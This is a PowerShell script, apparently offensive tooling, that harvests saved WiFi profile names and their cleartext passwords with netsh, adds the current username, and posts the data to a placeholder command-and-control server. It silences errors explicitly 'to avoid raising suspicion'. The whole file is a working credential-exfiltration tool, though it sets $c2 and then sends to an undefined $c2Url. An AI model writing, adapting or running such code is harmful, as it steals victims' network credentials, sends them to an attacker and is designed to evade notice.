# Define the C2 server endpoint
$c2 = "http://<C2_PUBLIC_IP>/upload"

# Extract WiFi profiles and passwords
$wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":\s*")[1].Trim() }
$data = ""

$wifiProfiles | ForEach-Object {
    $profile = $_
    $profileInfo = netsh wlan show profile name="$profile" key=clear
    $passwordMatch = $profileInfo | Select-String "Key Content\s*:\s*(.*)" | ForEach-Object { $_.Matches[0].Groups[1].Value }
    $password = if ($passwordMatch) { $passwordMatch } else { "N/A" }
    $data += "Profile: $profile`nPassword: $password`n`n"
}

# Add user information
$data += "`nUser Info: $(whoami)`n"

# Send data to C2 server
try {
    $webRequest = [System.Net.WebRequest]::Create($c2Url)
    $webRequest.Method = "POST"
    $webRequest.ContentType = "text/plain"
    $dataBytes = [System.Text.Encoding]::UTF8.GetBytes($data)
    $webRequest.ContentLength = $dataBytes.Length
    $requestStream = $webRequest.GetRequestStream()
    $requestStream.Write($dataBytes, 0, $dataBytes.Length)
    $requestStream.Close()

    $response = $webRequest.GetResponse()
    $responseStream = $response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($responseStream)
    $reader.ReadToEnd() | Out-Null
    $reader.Close()
    $responseStream.Close()
    $response.Close()
} catch {
    # Suppress errors to avoid raising suspicion
}
